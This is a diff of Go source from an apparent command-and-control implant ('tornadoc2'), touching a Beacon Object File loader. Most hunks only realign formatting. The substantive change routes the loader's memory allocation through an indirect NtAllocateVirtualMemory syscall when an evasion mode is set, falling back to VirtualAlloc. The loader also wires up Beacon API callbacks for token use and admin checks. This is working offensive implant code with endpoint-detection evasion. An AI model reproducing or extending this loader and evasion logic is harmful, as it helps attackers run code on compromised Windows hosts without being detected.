@@ -36,19 +36,22 @@ import (
 	"sync"
 	"syscall"
 	"unsafe"
+
+	"tornadoc2/agent/evasion"
+	"tornadoc2/agent/syscalls"
 )
 
 // ---------------------------------------------------------------
 // Memory helpers
 
 var (
-	bofKernel32             = syscall.NewLazyDLL("kernel32.dll")
-	bofVirtualAlloc         = bofKernel32.NewProc("VirtualAlloc")
-	bofVirtualFree          = bofKernel32.NewProc("VirtualFree")
-	bofVirtualProtect       = bofKernel32.NewProc("VirtualProtect")
-	bofLoadLibraryA         = bofKernel32.NewProc("LoadLibraryA")
-	bofGetProcAddress       = bofKernel32.NewProc("GetProcAddress")
-	bofGetModuleHandleA     = bofKernel32.NewProc("GetModuleHandleA")
+	bofKernel32         = syscall.NewLazyDLL("kernel32.dll")
+	bofVirtualAlloc     = bofKernel32.NewProc("VirtualAlloc")
+	bofVirtualFree      = bofKernel32.NewProc("VirtualFree")
+	bofVirtualProtect   = bofKernel32.NewProc("VirtualProtect")
+	bofLoadLibraryA     = bofKernel32.NewProc("LoadLibraryA")
+	bofGetProcAddress   = bofKernel32.NewProc("GetProcAddress")
+	bofGetModuleHandleA = bofKernel32.NewProc("GetModuleHandleA")
 )
 
 const (
@@ -56,9 +59,9 @@ const (
 	bofMemReserve = 0x2000
 	bofMemRelease = 0x8000
 
-	bofPageReadOnly       = 0x02
-	bofPageReadWrite      = 0x04
-	bofPageExecuteRead    = 0x20
+	bofPageReadOnly         = 0x02
+	bofPageReadWrite        = 0x04
+	bofPageExecuteRead      = 0x20
 	bofPageExecuteReadWrite = 0x40
 
 	bofScnMemExecute = 0x20000000
@@ -72,11 +75,22 @@ func bofAlloc(size uintptr) (uintptr, error) {
 	if size == 0 {
 		size = bofPageSize
 	}
-	p, _, err := bofVirtualAlloc.Call(0, size,
-		uintptr(bofMemCommit|bofMemReserve),
-		uintptr(bofPageReadWrite))
-	if p == 0 {
-		return 0, fmt.Errorf("VirtualAlloc(%d): %v", size, err)
+	p := uintptr(0)
+	region := size
+	var err error
+	if evasion.SyscallMethod() == "indirect" {
+		err = syscalls.NtAllocateVirtualMemory(^uintptr(0), &p, 0,
+			&region, bofMemCommit|bofMemReserve, bofPageReadWrite)
+	}
+	if err != nil || p == 0 {
+		var callErr error
+		p, _, callErr = bofVirtualAlloc.Call(0, size,
+			uintptr(bofMemCommit|bofMemReserve),
+			uintptr(bofPageReadWrite))
+		if p == 0 {
+			return 0, fmt.Errorf("VirtualAlloc(%d): %v (%v)",
+				size, callErr, err)
+		}
 	}
 	return p, nil
 }
@@ -112,10 +126,10 @@ type bofSection struct {
 }
 
 type bofSymbol struct {
-	name     string
-	value    uint32
-	secNum   int16
-	class    uint8
+	name   string
+	value  uint32
+	secNum int16
+	class  uint8
 
 	// runtime
 	resolved uintptr
@@ -134,9 +148,9 @@ func bofPtrSize() uintptr { return unsafe.Sizeof(uintptr(0)) }
 // Output, key-value, and the Beacon API callbacks
 
 type bofState struct {
-	mu     sync.Mutex
-	output strings.Builder
-	kv     map[string]uintptr
+	mu       sync.Mutex
+	output   strings.Builder
+	kv       map[string]uintptr
 	symCache map[string]uintptr
 }
 
@@ -600,24 +614,24 @@ func bofRevertTokenCb() uintptr {
 // NewCallback per BOF would leak the callback slot.
 
 var (
-	bofCbPrintf     uintptr
-	bofCbOutput     uintptr
-	bofCbDataParse  uintptr
+	bofCbPrintf      uintptr
+	bofCbOutput      uintptr
+	bofCbDataParse   uintptr
 	bofCbDataExtract uintptr
-	bofCbDataInt    uintptr
-	bofCbDataShort  uintptr
-	bofCbDataLength uintptr
-	bofCbFmtAlloc   uintptr
-	bofCbFmtReset   uintptr
-	bofCbFmtFree    uintptr
-	bofCbFmtAppend  uintptr
-	bofCbFmtPrintf  uintptr
+	bofCbDataInt     uintptr
+	bofCbDataShort   uintptr
+	bofCbDataLength  uintptr
+	bofCbFmtAlloc    uintptr
+	bofCbFmtReset    uintptr
+	bofCbFmtFree     uintptr
+	bofCbFmtAppend   uintptr
+	bofCbFmtPrintf   uintptr
 	bofCbFmtToString uintptr
-	bofCbAddValue   uintptr
-	bofCbGetValue   uintptr
+	bofCbAddValue    uintptr
+	bofCbGetValue    uintptr
 	bofCbRemoveValue uintptr
-	bofCbIsAdmin    uintptr
-	bofCbUseToken   uintptr
+	bofCbIsAdmin     uintptr
+	bofCbUseToken    uintptr
 	bofCbRevertToken uintptr
 )
 
